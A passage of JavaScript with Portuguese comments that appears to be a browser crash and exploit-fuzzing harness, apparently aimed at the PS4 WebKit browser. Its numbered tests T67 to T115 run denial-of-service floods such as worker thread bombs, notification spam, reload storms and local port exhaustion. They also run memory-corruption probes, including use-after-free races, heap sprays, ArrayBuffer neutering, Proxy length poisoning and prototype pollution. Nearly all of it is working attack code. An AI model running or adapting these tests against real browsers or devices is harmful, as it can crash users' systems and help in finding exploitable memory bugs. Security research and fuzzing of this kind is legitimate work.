                clearInterval(loop);
                log(">> T66: Userland memory limit hit.");
            }
        }, 500);
    } catch(e) {
        log(">> T66 OOM Panic: " + e.message);
    }
}

function runTest67() {
    log("Iniciando T67: Iframe Reload Storm...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var count = 0;
    
    var t = setInterval(function() {
        f.src = window.location.href + "?storm=" + Math.random();
        count++;
        
        if(count % 20 === 0) {
            // Cria garbage no history stack
            history.replaceState(null, null, "/?r=" + count);
        }
        
        if(count > 200) {
            clearInterval(t);
            document.body.removeChild(f);
            log(">> T67: Reload storm stop.");
        }
    }, 15); // Reload muito rápido
}

function runTest68() {
    log("Iniciando T68: Notification API DoS...");
    var notes = [];
    
    if(!("Notification" in window)) {
        log(">> T68: API não suportada.");
        return;
    }
    
    try {
        var spam = setInterval(function() {
            var n = new Notification("CRASH TEST " + Math.random(), {
                body: "A".repeat(1000),
                icon: "http://localhost/junk.png"
            });
            notes.push(n);
            
            // Tenta fechar e reabrir rapidamente para estressar o daemon de UI
            if(notes.length > 50) {
                var old = notes.shift();
                old.close();
            }
            
            if(notes.length > 500) clearInterval(spam);
        }, 10);
    } catch(e) {
        log(">> T68 Error: " + e.message);
    }
}

function runTest69() {
    log("Iniciando T69: GPU Shader Compiler Hang...");
    var c = document.createElement('canvas');
    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    
    if(!gl) {
        log(">> T69: WebGL desabilitado (Esperado). Tentando Canvas 2D Path complexo.");
        // Fallback para Canvas 2D Path Storm
        var ctx = c.getContext('2d');
        ctx.beginPath();
        for(var i=0; i<100000; i++) {
            ctx.rect(i%100, i%100, 1, 1);
        }
        ctx.clip(); // Clip complexo é pesado
        ctx.fill();
        log(">> T69: 2D Path Clip enviado.");
        return;
    }
    // Caso WebGL esteja ativo por algum motivo (exploit vector raro)
    log(">> T69: WebGL active?!?");
}

function runTest70() {
    log("Iniciando T70: WebSQL Transaction Lock...");
    if(!window.openDatabase) {
        log(">> T70: WebSQL não suportado.");
        return;
    }
    
    var db = openDatabase('crashDB', '1.0', 'Crash Test', 2 * 1024 * 1024);
    var tables = 0;
    
    function flood() {
        db.transaction(function(tx) {
            for(var i=0; i<500; i++) {
                tx.executeSql('CREATE TABLE IF NOT EXISTS t'+tables+' (id unique, log)');
                tx.executeSql('INSERT INTO t'+tables+' (id, log) VALUES (1, "'+ "x".repeat(1000) +'")');
                tables++;
            }
            // Recursão dentro da transação para travar o thread SQL
            if(tables < 5000) setTimeout(flood, 0);
            else log(">> T70: SQL Flood sent.");
        });
    }
    flood();
}
function runTest71() {
    log("Iniciando T71: Array Constructor Poison...");
    var original = Array.prototype.constructor;
    var count = 0;
    
    var p = new Proxy(Array, {
        construct: function(target, args) {
            count++;
            if(count % 50 === 0) {
                var junk = new Uint32Array(1024).fill(0x1337);
                return { length: 0xFFFFFFFF }; 
            }
            return new target(...args);
        }
    });
    
    try {
        var a = new p(10);
        var b = Array.from({length: 1000}, (v, k) => k); 
        
        b.constructor = p;
        var c = b.slice(0, 500);
        
        log(">> T71: Poisoned slice executed.");
    } catch(e) {
        log(">> T71 Logic Error: " + e.message);
    }
}

function runTest72() {
    log("Iniciando T72: Function Bind Recursion...");
    var fn = function() { return 1; };
    var bound = fn;
    
    try {
        for(var i=0; i<50000; i++) {
            bound = bound.bind(null, i);
        }
        log(".. Binding depth: 50000");
        
        var res = bound();
        log(">> T72: Execution survived depth.");
    } catch(e) {
        log(">> T72 Stack Limit: " + e.message);
    }
}

function runTest73() {
    log("Iniciando T73: JSON Cyclic Stringify...");
    var a = {};
    var b = {parent: a};
    a.child = b;
    
    var replacer = function(key, value) {
        if(key === 'parent') {
            var leak = new Array(1000).fill(1.1);
            return value; 
        }
        return value;
    };
    
    try {
        // Tenta enganar a detecção de ciclo manipulando o objeto durante o stringify
        var s = JSON.stringify(a, replacer);
        log(">> T73: Stringify completed (Unexpected).");
    } catch(e) {
        log(">> T73 Cycle Detected/Crash: " + e.message);
        var cleanup = new ArrayBuffer(0x10000);
    }
}

function runTest74() {
    log("Iniciando T74: Accessor Property Stack...");
    var obj = {};
    var depth = 0;
    
    function makeGetter(prev) {
        return function() {
            depth++;
            var x = new Uint8Array(16); 
            return prev.val + 1;
        };
    }
    
    var curr = {val: 1};
    for(var i=0; i<3000; i++) {
        var next = {};
        Object.defineProperty(next, 'val', {
            get: makeGetter(curr),
            configurable: true
        });
        curr = next;
    }
    
    try {
        var res = curr.val;
        log(">> T74: Accessor chain depth: " + depth);
    } catch(e) { log(">> T74 Limit: " + e.message); }
}

function runTest75() {
    log("Iniciando T75: WebKit URL Parser Overflow...");
    var base = "http://a.com/";
    var huge = "x".repeat(0x10000); 
    var urls = [];
    
    try {
        for(var i=0; i<50; i++) {
            var u = new URL(huge, base);
            u.username = "user" + "A".repeat(5000);
            u.password = "pass" + "B".repeat(5000);
            u.search = "?q=" + "C".repeat(5000);
            u.hash = "#" + "D".repeat(5000);
            urls.push(u.href);
            
            if(i % 10 === 0) {
                var check = u.toString();
                if(check.length < 100) throw "Truncated";
            }
        }
        log(">> T75: URL parsing stress done.");
    } catch(e) { log(">> T75 Erro: " + e.message); }
}

function runTest76() {
    log("Iniciando T76: Canvas Pixel Manipulation...");
    var c = document.createElement('canvas');
    c.width = 4096; c.height = 4096; 
    var ctx = c.getContext('2d');
    
    if(!ctx) { log(">> T76: Context failed."); return; }
    
    try {
        // Aloca buffer massivo para putImageData (4096*4096*4 bytes = ~64MB)
        var arr = new Uint8ClampedArray(4096 * 4096 * 4);
        arr.fill(255);
        var imgData = new ImageData(arr, 4096, 4096);
        
        for(var i=0; i<10; i++) {
            ctx.putImageData(imgData, 0, 0); 
            var sub = ctx.getImageData(100, 100, 2000, 2000); 
            log(".. Cycle " + i + " GPU memory hit");
        }
        log(">> T76: Large Pixel Buffer operations done.");
    } catch(e) {
        log(">> T76 OOM: " + e.message);
    }
}

function runTest77() {
    log("Iniciando T77: TextEncoder Memory Spike...");
    var enc = new TextEncoder();
    var chunk = "A".repeat(1024 * 1024); 
    var arr = [];
    
    try {
        for(var i=0; i<200; i++) {
            // Encode cria Uint8Array nativo. Fazer isso rápido fragmenta o heap.
            var u8 = enc.encode(chunk + i);
            arr.push(u8);
            
            // Força liberar a cada 50MB para causar "churn"
            if(arr.length > 50) {
                arr = [];
                var hole = new ArrayBuffer(1024 * 512); 
            }
        }
        log(">> T77: Encoding churn finished.");
    } catch(e) { log(">> T77 Crash: " + e.message); }
}

function runTest78() {
    log("Iniciando T78: DOM Deep Clone...");
    var root = document.createElement('div');
    var curr = root;
    for(var i=0; i<2000; i++) {
        var el = document.createElement('div');
        el.setAttribute('data-id', i);
        curr.appendChild(el);
        curr = el;
    }
    
    try {
        var clones = [];
        for(var k=0; k<50; k++) {
            var c = root.cloneNode(true); 
            clones.push(c);
            if(k % 10 === 0) log(".. Clone " + k);
        }
        clones = null; 
        log(">> T78: Deep cloning stress passed.");
    } catch(e) {
        log(">> T78 Stack/Mem Error: " + e.message);
    }
}

function runTest79() {
    log("Iniciando T79: Huge Scroll Event Flood...");
    var d = document.createElement('div');
    d.style.height = "50000px";
    d.style.overflow = "scroll";
    document.body.appendChild(d);
    
    var count = 0;
    d.addEventListener('scroll', function() {
        count++;
        // Heavy logic inside high-frequency event
        var m = new Float32Array(1000);
        for(var j=0; j<1000; j++) m[j] = Math.random();
    });
    
    var t = setInterval(function() {
        d.scrollTop = Math.random() * 50000;
        if(count > 2000) {
            clearInterval(t);
            document.body.removeChild(d);
            log(">> T79: Scroll flood finish. Events: " + count);
        }
    }, 1); 
}

function runTest80() {
    log("Iniciando T80: Iframe Sandbox Violation...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    var i = setInterval(function() {
        var f = document.createElement('iframe');
        // Sandbox restrito tentando executar script via srcdoc (Kernel check violation)
        f.setAttribute("sandbox", "allow-same-origin"); 
        f.srcdoc = "<script>while(1);<\/script>";
        container.appendChild(f);
        
        var f2 = document.createElement('iframe');
        f2.setAttribute("sandbox", "allow-scripts");
        f2.src = "data:text/html,<script>parent.log('try');<\/script>";
        container.appendChild(f2);
        
        if(container.childNodes.length > 50) {
            container.innerHTML = "";
            log(".. Sandbox cycle");
        }
    }, 100);
    
    setTimeout(function() {
        clearInterval(i);
        log(">> T80: Sandbox stress stopped.");
    }, 3000);
}
function runTest81() {
    log("Iniciando T81: DOM Token List Toggle Race...");
    var el = document.createElement('div');
    var cls = el.classList;
    var count = 0;
    var classes = [];
    for(var i=0; i<1000; i++) classes.push("c" + i);
    
    try {
        var t = setInterval(function() {
            for(var j=0; j<200; j++) {
                var c = classes[Math.floor(Math.random() * classes.length)];
                cls.toggle(c); 
            }
            if(cls.length > 500) {
                el.className = ""; 
                var spray = new Uint32Array(0x100).fill(0x41414141);
            }
            count++;
            if(count > 1000) {
                clearInterval(t);
                log(">> T81: ClassList thrashing done.");
            }
        }, 0);
    } catch(e) { log(">> T81 Erro: " + e.message); }
}

function runTest82() {
    log("Iniciando T82: WeakMap GC Thrashing...");
    var wm = new WeakMap();
    var cycles = 0;
    
    function churn() {
        var root = {};
        for(var i=0; i<5000; i++) {
            var k = {id: i};
            var v = new Uint8Array(1024); 
            wm.set(k, v);
        }
        cycles++;
        if(cycles % 10 === 0) log(".. GC Cycle " + cycles);
        
        if(cycles < 50) setTimeout(churn, 10); 
        else log(">> T82: WeakMap stress complete.");
    }
    churn();
}

function runTest83() {
    log("Iniciando T83: Text Node Split/Normalize...");
    var d = document.createElement('div');
    d.appendChild(document.createTextNode("A".repeat(10000)));
    document.body.appendChild(d);
    
    try {
        for(var i=0; i<2000; i++) {
            var node = d.firstChild;
            if(node && node.nodeType === 3) {
                var split = node.splitText(5000); 
                d.normalize(); 
                
                if(i % 100 === 0) {
                    var r = document.createRange();
                    r.selectNode(d); 
                    r.detach();
                }
            } else {
                d.textContent = "A".repeat(10000);
            }
        }
        document.body.removeChild(d);
        log(">> T83: Text operations finished.");
    } catch(e) { log(">> T83 Crash Logic: " + e.message); }
}

function runTest84() {
    log("Iniciando T84: Property Hash Collision...");
    var obj = {};
    var count = 0;
    
    try {
        // Gera chaves que tendem a colidir em algoritmos de hash simples
        for(var i=0; i<20000; i++) {
            var key = "key_" + i.toString(36) + "_" + (i*31);
            obj[key] = i;
            
            if(i % 1000 === 0) {
                delete obj["key_" + (i-500).toString(36) + "_" + ((i-500)*31)];
            }
        }
        
        var seek = 0;
        for(var k in obj) { seek++; }
        
        log(">> T84: Hash table stress. Keys: " + seek);
    } catch(e) {
        log(">> T84 OOM/Limit: " + e.message);
    }
}

function runTest85() {
    log("Iniciando T85: FormData Multipart Flood...");
    var fd = new FormData();
    var blob = new Blob(["x".repeat(1024)], {type: 'application/octet-stream'});
    
    try {
        for(var i=0; i<5000; i++) {
            fd.append("file" + i, blob, "filename" + i + ".bin");
        }
        
        var req = new XMLHttpRequest();
        req.open("POST", "/dump");
        // Serialização interna do FormData pode estourar buffer
        req.send(fd);
        
        log(">> T85: Huge Multipart payload built.");
    } catch(e) {
        log(">> T85 Serialization Fail: " + e.message);
    }
}

function runTest86() {
    log("Iniciando T86: Worker Thread Bomb...");
    var workers = [];
    var code = "self.onmessage=function(){var i=0;while(true)i++;}"; 
    var blob = new Blob([code], {type: 'application/javascript'});
    var url = URL.createObjectURL(blob);
    
    try {
        var t = setInterval(function() {
            var w = new Worker(url);
            w.postMessage("start");
            workers.push(w);
            
            if(workers.length > 20) { 
                var dead = workers.shift();
                dead.terminate();
            }
            log(".. Thread cycle active");
            
            if(workers.length > 200) clearInterval(t); 
        }, 100);
        
        setTimeout(function() {
            clearInterval(t);
            workers.forEach(w => w.terminate());
            log(">> T86: Thread limit stress stop.");
        }, 5000);
    } catch(e) { log(">> T86 System Limit: " + e.message); }
}

function runTest87() {
    log("Iniciando T87: Sync File Read Lock...");
    var readers = [];
    var huge = new Uint8Array(1024 * 1024 * 5).fill(65);
    var b = new Blob([huge]);
    
    try {
        for(var i=0; i<50; i++) {
            var fr = new FileReader();
            // Leitura síncrona não existe em FileReader padrão, mas simulamos carga pesada
            // disparando múltiplos reads simultâneos em blob grande
            fr.readAsDataURL(b); 
            readers.push(fr);
            
            if(i % 10 === 0) {
                var junk = new ArrayBuffer(1024 * 1024); 
            }
        }
        log(">> T87: I/O buffers saturated.");
    } catch(e) { log(">> T87 Erro: " + e.message); }
}

function runTest88() {
    log("Iniciando T88: Table Layout Recalc OOM...");
    var t = document.createElement('table');
    document.body.appendChild(t);
    t.style.tableLayout = "auto"; 
    
    try {
        for(var r=0; r<200; r++) {
            var row = t.insertRow();
            for(var c=0; c<50; c++) {
                var cell = row.insertCell();
                cell.textContent = "W" + c + "H" + r + " ".repeat(r % 10);
            }
        }
        
        // Força "Reflow" massivo alterando larguras
        setTimeout(function() {
            t.style.width = "10px";
            var x = t.offsetWidth; 
            t.style.width = "10000px";
            var y = t.offsetWidth;
            document.body.removeChild(t);
            log(">> T88: Table Layout Thrashing done.");
        }, 100);
    } catch(e) { log(">> T88 Render Fail: " + e.message); }
}

function runTest89() {
    log("Iniciando T89: Math.pow Watchdog Kill...");
    var res = 0;
    var start = Date.now();
    
    try {
        // Loop "quase" infinito para disparar o watchdog do kernel
        // PS4 mata processos que seguram a CPU por muito tempo
        while(Date.now() - start < 3000) {
            for(var i=0; i<1000; i++) {
                res = Math.pow(Math.random(), Math.random());
            }
            // Pequena pausa para enganar detecção simples, mas manter carga alta
            var arr = new Uint8Array(100); 
        }
        log(">> T89: CPU Stress Test Survived.");
    } catch(e) {
        log(">> T89 Watchdog: " + e.message);
    }
}

function runTest90() {
    log("Iniciando T90: Huge URL Search Params...");
    var params = new URLSearchParams();
    var val = "X".repeat(1000);
    
    try {
        for(var i=0; i<10000; i++) {
            params.append("k"+i, val);
        }
        
        var str = params.toString();
        log(".. Params string len: " + str.length);
        
        var reparse = new URLSearchParams(str);
        reparse.forEach(function(v, k) {
             if(k === "k5000") {
                 reparse.delete("k0"); 
                 var hole = new ArrayBuffer(1024);
             }
        });
        
        log(">> T90: URL parsing/serialization OOM test.");
    } catch(e) {
        log(">> T90 Memory Fail: " + e.message);
    }
}
function runTest91() {
    log("Iniciando T91: TreeWalker Filter UAF...");
    var root = document.createElement('div');
    root.innerHTML = "<div><span></span><b></b></div>".repeat(100);
    document.body.appendChild(root);
    
    var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node.tagName === 'SPAN') {
                node.parentNode.removeChild(node);
                var spray = new Uint8Array(0x20).fill(0x41);
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    }, false);
    
    try {
        while(walker.nextNode()) {
            var curr = walker.currentNode;
            if(curr) curr.textContent = "uaf";
        }
        log(">> T91: TreeWalker traversal finished.");
    } catch(e) { log(">> T91 Erro: " + e.message); }
    document.body.removeChild(root);
}

function runTest92() {
    log("Iniciando T92: Array Concat Spread Poison...");
    var a = [1, 2, 3];
    var p = new Proxy([], {
        get: function(target, prop) {
            if(prop === Symbol.isConcatSpreadable) {
                a.length = 0;
                var junk = new Array(10000).fill(1.1);
                return true;
            }
            if(prop === 'length') return 0xFFFFFFFF;
            return 1;
        }
    });
    
    try {
        var res = a.concat(p);
        log(">> T92: Concat executed. Len: " + res.length);
    } catch(e) {
        log(">> T92 Logic Error: " + e.message);
    }
}

function runTest93() {
    log("Iniciando T93: RegExp LastIndex Overflow...");
    var re = /a/g;
    var str = "a".repeat(1000);
    var count = 0;
    
    try {
        re.lastIndex = 0xFFFFFFF0; 
        
        while(re.exec(str) !== null) {
            count++;
            if(count > 10) break;
        }
        
        re.lastIndex = { valueOf: function() { 
            str = "b".repeat(1000); 
            return 0; 
        }};
        
        re.exec(str);
        log(">> T93: RegExp state manipulation done.");
    } catch(e) { log(">> T93 Erro: " + e.message); }
}

function runTest94() {
    log("Iniciando T94: Textarea Layout Thrashing...");
    var t = document.createElement('textarea');
    document.body.appendChild(t);
    var val = "X".repeat(500);
    
    try {
        for(var i=0; i<1000; i++) {
            t.value = val;
            t.cols = i % 100;
            t.rows = i % 50;
            
            if(i % 10 === 0) {
                t.style.position = (i%2===0) ? "absolute" : "fixed";
                var r = t.getBoundingClientRect(); 
                t.wrap = (i%2===0) ? "off" : "soft";
            }
        }
        log(">> T94: Layout object stressed.");
    } catch(e) { log(">> T94 Erro: " + e.message); }
    document.body.removeChild(t);
}

function runTest95() {
    log("Iniciando T95: FontFace Recursive Load...");
    var fonts = [];
    var depth = 0;
    
    function loadNext() {
        depth++;
        if(depth > 500) return;
        var f = new FontFace('f'+depth, 'url(data:font/woff;base64,AAAA...)');
        fonts.push(f);
        document.fonts.add(f);
        f.load().then(function() {
            loadNext();
            if(depth % 50 === 0) document.fonts.clear();
        }).catch(function(){});
    }
    
    loadNext();
    setTimeout(function() {
        log(">> T95: Font recursion depth: " + depth);
    }, 2000);
}

function runTest96() {
    log("Iniciando T96: Local Port mbuf Exhaustion...");
    var imgs = [];
    var port = 10000;
    
    var t = setInterval(function() {
        for(var i=0; i<50; i++) {
            var img = new Image();
            img.src = "http://127.0.0.1:" + port + "/socket_flood";
            imgs.push(img);
            port++;
        }
        
        if(imgs.length > 5000) {
            // Mantém referências vivas para segurar o socket no kernel (estado SYN_SENT)
            imgs = imgs.slice(2500); 
        }
        
        if(port > 60000) {
            clearInterval(t);
            log(">> T96: Port range scanned/flooded.");
        }
    }, 10);
}

function runTest97() {
    log("Iniciando T97: Blob URL Revocation Race...");
    var urls = [];
    var data = new Uint8Array(1024*1024).fill(0x90);
    var b = new Blob([data]);
    
    var t = setInterval(function() {
        for(var i=0; i<100; i++) {
            var u = URL.createObjectURL(b);
            urls.push(u);
        }
        
        while(urls.length > 0) {
            var target = urls.shift();
            URL.revokeObjectURL(target);
            // Race: Tenta usar URL revogada imediatamente
            var x = new XMLHttpRequest();
            x.open("GET", target, true);
            try { x.send(); } catch(e){}
        }
        
        if(Math.random() > 0.95) log(".. Race cycle active");
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T97: Blob race stopped.");
    }, 3000);
}

function runTest98() {
    log("Iniciando T98: Iframe Nesting Depth Kill...");
    var d = document.createElement('div');
    document.body.appendChild(d);
    var html = "";
    
    for(var i=0; i<4000; i++) {
        html += "<div>";
    }
    html += "<span>Bottom</span>";
    for(var i=0; i<4000; i++) {
        html += "</div>";
    }
    
    try {
        d.innerHTML = html;
        var targets = d.getElementsByTagName("div");
        log(".. Deep DOM created. Nodes: " + targets.length);
        
        // Força renderização pesada
        var h = d.offsetHeight; 
        d.innerHTML = "";
        log(">> T98: Deep nesting parsed and cleared.");
    } catch(e) {
        log(">> T98 Stack Overflow: " + e.message);
    }
}

function runTest99() {
    log("Iniciando T99: Canvas Gradient Mem Leak...");
    var c = document.createElement('canvas');
    c.width = 2000; c.height = 2000;
    var ctx = c.getContext('2d');
    
    try {
        for(var i=0; i<5000; i++) {
            var g = ctx.createLinearGradient(0, 0, 2000, 2000);
            for(var j=0; j<100; j++) {
                g.addColorStop(j/100, "rgb("+ (i%255) +",0,0)");
            }
            ctx.fillStyle = g;
            ctx.fillRect(0,0,100,100);
            
            if(i % 1000 === 0) log(".. Gradients created: " + i);
        }
        log(">> T99: GPU Gradient buffer stress.");
    } catch(e) { log(">> T99 GPU OOM: " + e.message); }
}

function runTest100() {
    log("Iniciando T100: THE OMEGA COMBO...");
    var running = true;
    
    // 1. Thread Stress
    var b = new Blob(["while(true) Math.random();"], {type:'text/javascript'});
    var w = new Worker(URL.createObjectURL(b));
    
    // 2. Memory Stress
    var arr = [];
    var memInt = setInterval(function() {
        if(!running) return;
        try { arr.push(new ArrayBuffer(1024*1024*10)); } catch(e){}
    }, 100);
    
    // 3. DOM/Layout Stress
    var domInt = setInterval(function() {
        if(!running) return;
        var d = document.createElement('div');
        d.innerHTML = "X".repeat(10000);
        document.body.appendChild(d);
        var x = d.offsetWidth;
        document.body.removeChild(d);
    }, 10);
    
    // 4. History Stress
    var histInt = setInterval(function() {
        if(!running) return;
        try { history.pushState({}, "t", "?t="+Math.random()); } catch(e){}
    }, 50);

    setTimeout(function() {
        running = false;
        w.terminate();
        clearInterval(memInt);
        clearInterval(domInt);
        clearInterval(histInt);
        arr = null;
        log(">> T100: Combo finished. Check system stability.");
    }, 5000);
}
function runTest101() {
    log("Iniciando T101: Attribute Node SetNamedItem Race...");
    var el = document.createElement('div');
    var attr = document.createAttribute('test');
    attr.value = "A".repeat(100);
    var running = true;
    
    setTimeout(function() { running = false; log(">> T101: Race stopped."); }, 3000);
    
    function race() {
        if(!running) return;
        try {
            el.setAttributeNode(attr);
            var removed = el.removeAttributeNode(attr);
            if(Math.random() > 0.5) {
                removed.value = "B".repeat(200); 
            }
            // Tenta corromper a referência do atributo reutilizando-o imediatamente
            el.setAttributeNode(removed);
        } catch(e) {}
        setTimeout(race, 0);
    }
    race();
}

function runTest102() {
    log("Iniciando T102: Event Listener Remove-Add Loop...");
    var t = document.createElement('div');
    var count = 0;
    
    function handler() {
        count++;
        var junk = new Uint32Array(100);
    }
    
    try {
        for(var i=0; i<10000; i++) {
            t.addEventListener('click', handler);
            if(i % 2 === 0) t.removeEventListener('click', handler);
            
            if(i % 1000 === 0) {
                // Força re-indexing da lista interna de listeners
                var ev = new Event('click');
                t.dispatchEvent(ev);
            }
        }
        log(">> T102: Listener list churn finished.");
    } catch(e) { log(">> T102 Erro: " + e.message); }
}

function runTest103() {
    log("Iniciando T103: Canvas GetContext Type Flip...");
    var c = document.createElement('canvas');
    var count = 0;
    
    try {
        for(var i=0; i<500; i++) {
            // Tenta confundir o estado interno do canvas pedindo contextos diferentes
            // Mesmo que spec diga que retorna null, a implementação pode falhar na limpeza
            var ctx2d = c.getContext('2d');
            var ctxGl = c.getContext('webgl'); 
            
            if(ctx2d) {
                ctx2d.fillStyle = "red";
                ctx2d.fillRect(0,0,10,10);
            }
            
            // Recria o elemento para resetar, mas mantém referência antiga no GC
            if(i % 50 === 0) {
                c = document.createElement('canvas');
                c.width = 1000; c.height = 1000;
            }
            count++;
        }
        log(">> T103: Context flipping attempts: " + count);
    } catch(e) { log(">> T103 Erro: " + e.message); }
}

function runTest104() {
    log("Iniciando T104: XMLSerializer Recursive Bomb...");
    var doc = document.implementation.createDocument(null, "root", null);
    var root = doc.documentElement;
    var curr = root;
    
    // Cria árvore XML muito profunda
    for(var i=0; i<3000; i++) {
        var el = doc.createElement("node");
        curr.appendChild(el);
        curr = el;
    }
    
    try {
        var s = new XMLSerializer();
        var str = s.serializeToString(doc);
        log(">> T104: Serialized length: " + str.length);
    } catch(e) {
        log(">> T104 Stack Overflow: " + e.message);
    }
}

function runTest105() {
    log("Iniciando T105: Object GetOwnPropertyDescriptor Stress...");
    var obj = {};
    for(var i=0; i<2000; i++) obj["p"+i] = i;
    
    try {
        var start = Date.now();
        while(Date.now() - start < 2000) {
            for(var i=0; i<2000; i++) {
                var d = Object.getOwnPropertyDescriptor(obj, "p"+i);
                if(d.value !== i) throw "Corruption";
                
                // Cria objetos descritores temporários rapidamento
                if(i % 100 === 0) {
                    Object.defineProperty(obj, "p"+i, {enumerable: false});
                }
            }
        }
        log(">> T105: Descriptor allocation stress done.");
    } catch(e) { log(">> T105 Erro: " + e.message); }
}

function runTest106() {
    log("Iniciando T106: Iframe Src Blob Recursion...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    var html = "<script>if(window.parent) window.parent.postMessage('ping', '*');<\/script>";
    var blob = new Blob([html], {type: 'text/html'});
    var url = URL.createObjectURL(blob);
    var frames = [];
    
    var t = setInterval(function() {
        var f = document.createElement('iframe');
        f.src = url;
        container.appendChild(f);
        frames.push(f);
        
        if(frames.length > 200) {
            container.removeChild(frames.shift());
        }
        
        if(frames.length > 500) {
             clearInterval(t);
             log(">> T106: Frame cycle finished.");
        }
    }, 20);
}

function runTest107() {
    log("Iniciando T107: XHR Abort Race Condition...");
    var reqs = [];
    
    var t = setInterval(function() {
        for(var i=0; i<10; i++) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "/" + Math.random(), true);
            xhr.send();
            reqs.push(xhr);
            
            // Aborta imediatamente enquanto ainda está conectando
            // Tenta causar uso de ponteiro inválido no callback interno
            xhr.abort();
            
            // Reutiliza objeto abortado (algumas implementações antigas crashavam aqui)
            try { xhr.open("GET", "/", true); } catch(e){}
        }
        
        if(reqs.length > 2000) {
            reqs = [];
            log(".. XHR pool flushed");
        }
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T107: Network race stopped.");
    }, 3000);
}

function runTest108() {
    log("Iniciando T108: FileReader Sync Freeze...");
    var b = new Blob(["A".repeat(1024*1024*2)]);
    var readers = [];
    
    try {
        // Dispara múltiplas leituras simultâneas de blob grande
        for(var i=0; i<50; i++) {
            var fr = new FileReader();
            fr.readAsDataURL(b);
            readers.push(fr);
            
            // Força GC no blob original durante a leitura
            if(i === 25) {
                b = new Blob(["X"]); 
                var spray = new Uint8Array(1024*1024).fill(0xCC);
            }
        }
        log(">> T108: File readers queued.");
    } catch(e) { log(">> T108 Erro: " + e.message); }
}

function runTest109() {
    log("Iniciando T109: Huge Math Random Buffer...");
    var size = 1024 * 1024 * 20; // 20MB floats
    try {
        var f32 = new Float32Array(size);
        var start = Date.now();
        
        // Loop otimizado para preencher memória rapidamente
        for(var i=0; i<size; i+=8) {
            var r = Math.random();
            f32[i] = r; f32[i+1] = r; f32[i+2] = r; f32[i+3] = r;
            f32[i+4] = r; f32[i+5] = r; f32[i+6] = r; f32[i+7] = r;
        }
        
        // Tenta soma massiva para forçar paginação
        var sum = 0;
        for(var j=0; j<size; j+=100) sum += f32[j];
        
        log(">> T109: Buffer processed in " + (Date.now()-start) + "ms");
    } catch(e) {
        log(">> T109 OOM: " + e.message);
    }
}

function runTest110() {
    log("Iniciando T110: DOM Imp CreateDoc Flood...");
    var docs = [];
    var imp = document.implementation;
    
    try {
        var t = setInterval(function() {
            for(var i=0; i<50; i++) {
                // Cria documentos XML desconectados
                var d = imp.createDocument(null, "root"+i, null);
                var el = d.createElement("child");
                el.textContent = "Data".repeat(100);
                d.documentElement.appendChild(el);
                docs.push(d);
            }
            
            if(docs.length > 5000) {
                // Destrói referências em massa
                docs = []; 
                log(".. Documents flushed (GC pressure)");
            }
        }, 20);
        
        setTimeout(function() {
            clearInterval(t);
            log(">> T110: Document flood stopped.");
        }, 4000);
    } catch(e) { log(">> T110 Erro: " + e.message); }
}
function runTest111() {
    log("Iniciando T111: Array Buffer Neutering Race...");
    var ab = new ArrayBuffer(1024 * 1024);
    var w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var count = 0;
    
    var t = setInterval(function() {
        try {
            if(ab.byteLength > 0) {
                w.postMessage(ab, [ab]);
                // Tenta acessar buffer transferido imediatamente
                var view = new Uint8Array(ab);
                view[0] = 1; 
            } else {
                ab = new ArrayBuffer(1024 * 1024);
                // Heap Spray para preencher o vazio
                var spray = new Array(100).fill(new Float64Array(128));
            }
            count++;
            if(count > 2000) {
                clearInterval(t);
                w.terminate();
                log(">> T111: Neutering cycle finished.");
            }
        } catch(e) {}
    }, 1);
}

function runTest112() {
    log("Iniciando T112: Prototype Pollution Chain...");
    var root = Object.prototype;
    var chain = [];
    
    try {
        for(var i=0; i<5000; i++) {
            var key = "prop_" + Math.random().toString(36).substring(7);
            Object.defineProperty(root, key, {
                get: function() { 
                    var temp = new Uint8Array(1024);
                    return temp.fill(0x41); 
                },
                configurable: true
            });
            chain.push(key);
            
            if(i % 100 === 0) {
                // Força iteração em objeto limpo para disparar getters poluidos
                var clean = {};
                for(var k in clean) {}
            }
        }
        
        chain.forEach(k => delete root[k]);
        log(">> T112: Global prototype stressed.");
    } catch(e) { log(">> T112 Limit: " + e.message); }
}

function runTest113() {
    log("Iniciando T113: Event Dispatch Recursive Trap...");
    var d = document.createElement('div');
    var depth = 0;
    
    d.addEventListener('click', function(e) {
        depth++;
        if(depth < 2000) {
            var evt = new MouseEvent('click', {bubbles: true, cancelable: true});
            // Tenta modificar o evento durante o dispatch
            Object.defineProperty(evt, 'target', {value: null});
            d.dispatchEvent(evt);
        } else {
            var heavy = new Array(5000).join('x');
        }
    });
    
    try {
        d.dispatchEvent(new MouseEvent('click'));
        log(">> T113: Recursion depth: " + depth);
    } catch(e) { log(">> T113 Stack: " + e.message); }
}

function runTest114() {
    log("Iniciando T114: DOMStringMap Property Flood...");
    var el = document.createElement('div');
    var ds = el.dataset;
    var count = 0;
    
    try {
        var start = Date.now();
        while(Date.now() - start < 3000) {
            var key = "data" + count;
            ds[key] = "val" + count; 
            
            // Remove aleatoriamente para fragmentar
            if(count % 2 === 0) delete ds["data" + (count - 1)];
            
            if(count % 1000 === 0) {
                // Converte para atributos reais
                var attrs = el.attributes.length;
            }
            count++;
        }
        log(">> T114: Dataset operations: " + count);
    } catch(e) { log(">> T114 Erro: " + e.message); }
}

function runTest115() {
    log("Iniciando T115: Selection Extend Crash...");
    var s = window.getSelection();
    var d = document.createElement('div');
    d.contentEditable = true;
    d.innerHTML = "A".repeat(5000);
    document.body.appendChild(d);
    
    try {
        var r = document.createRange();
        r.selectNodeContents(d);
        s.removeAllRanges();
        s.addRange(r);
        
        for(var i=0; i<1000; i++) {
            s.extend(d, i);
            // Modifica o DOM sob a seleção ativa
            d.innerHTML = "B".repeat(5000 - i); 
            
            if(i % 50 === 0) {
                var junk = document.createTextNode("junk");
                d.appendChild(junk);
                s.extend(junk, 0);
            }
        }
        document.body.removeChild(d);
        log(">> T115: Selection stress finished.");
    } catch(e) { log(">> T115 Erro: " + e.message); }
}

function runTest116() {
